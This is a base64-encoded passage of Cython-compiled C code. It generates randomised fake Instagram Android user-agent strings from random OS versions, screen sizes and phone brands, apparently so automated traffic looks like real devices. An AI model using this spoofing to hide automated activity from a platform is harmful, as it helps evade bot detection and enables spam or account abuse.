ZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNywgNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApICE9ICgwKSkgX19QWVhfRVJSKDAsIDM3OSwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX3B5eF90XzMgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzgpKSkgewogICAgICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOCk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF84LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF90Xzd9OwogICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgfQogICAgICBfX3B5eF92X2FuZHJvaWRfdmVyc2lvbiA9IF9fcHl4X3RfMjsKICAgICAgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM4MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzODAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzODAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzgwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF92X2RwaSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfOCA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM4MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfOVswXSA9IF9fcHl4X3RfMjsKICAgICAgX19weXhfdF85WzFdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3g7CiAgICAgIF9fcHl4X3RfOVsyXSA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF85LCAzLCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzIpICsgMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNyksIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykpOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X3Jlc29sdXRpb24gPSAoKFB5T2JqZWN0KilfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF90XzIgPSBQeUxpc3RfTmV3KDEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU0FNU1VORyk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NBTVNVTkcpOwogICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NBTVNVTkcpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hVQVdFSSk7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFVBV0VJKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTEdFX2xnZSk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9MR0VfbGdlKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTEdFX2xnZSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRDKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVEMpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0FTVVMpOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BU1VTKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BU1VTKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpOwogICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT05FUExVUyk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09ORVBMVVMpOwogICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09ORVBMVVMpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSk7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCA3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PUFBPKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT1BQTyk7CiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8yLCA4LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT1BQTykgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVklWTyk7CiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1ZJVk8pOwogICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfMiwgOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1ZJVk8pICE9ICgwKSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDNfZXJyb3IpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpOwogICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TT05ZKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MM19lcnJvcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKTsKICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzIsIDExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzX2Vycm9yKTsKICAgICAgX19weXhfdF8zID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xKSkpIHsKICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEpOwogICAgICAgIGFzc2VydChfX3B5eF90XzcpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdF8yfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgX19weXhfdl9icmFuZCA9IF9fcHl4X3RfODsKICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzODQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzODQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzg0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF92X2J1aWxkX3N1ZmZpeCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfYW5kcm9pZF92ZXJzaW9uLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2JyYW5kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfMTBbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0luc3RhZ3JhbV8zMTFfMF8wXzMyXzExOF9BbmRyb2lkOwogICAgICBfX3B5eF90XzEwWzFdID0gX19weXhfdF8xOwogICAgICBfX3B5eF90XzEwWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fODsKICAgICAgX19weXhfdF8xMFszXSA9IF9fcHl4X3ZfZHBpOwogICAgICBfX3B5eF90XzEwWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9kcGk7CiAgICAgIF9fcHl4X3RfMTBbNV0gPSBfX3B5eF92X3Jlc29sdXRpb247CiAgICAgIF9fcHl4X3RfMTBbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184OwogICAgICBfX3B5eF90XzEwWzddID0gX19weXhfdF84OwogICAgICBfX3B5eF90XzEwWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TTV9UOwogICAgICBfX3B5eF90XzEwWzldID0gX19weXhfdl9tb2RlbF9udW1iZXI7CiAgICAgIF9fcHl4X3RfMTBbMTBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TTV9UOwogICAgICBfX3B5eF90XzEwWzExXSA9IF9fcHl4X3ZfbW9kZWxfbnVtYmVyOwogICAgICBfX3B5eF90XzEwWzEyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcWNvbV9lbl9VU181NDU5ODY7CiAgICAgIF9fcHl4X3RfMTBbMTNdID0gX19weXhfdl9idWlsZF9zdWZmaXg7CiAgICAgIF9fcHl4X3RfMTBbMTRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOTsKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMCwgMTUsIDM0ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIDIgKiAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdl9kcGkpICsgNSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3ZfcmVzb2x1dGlvbikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgNiAqIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF92X21vZGVsX251bWJlcikgKiAyICsgMjEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF92X2J1aWxkX3N1ZmZpeCkgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X2RwaSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9yZXNvbHV0aW9uKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzgpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3ZfbW9kZWxfbnVtYmVyKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X21vZGVsX251bWJlcikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9idWlsZF9zdWZmaXgpKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdl91c2VyX2FnZW50ID0gKChQeU9iamVjdCopX19weXhfdF8yKTsKICAgICAgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzggPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICA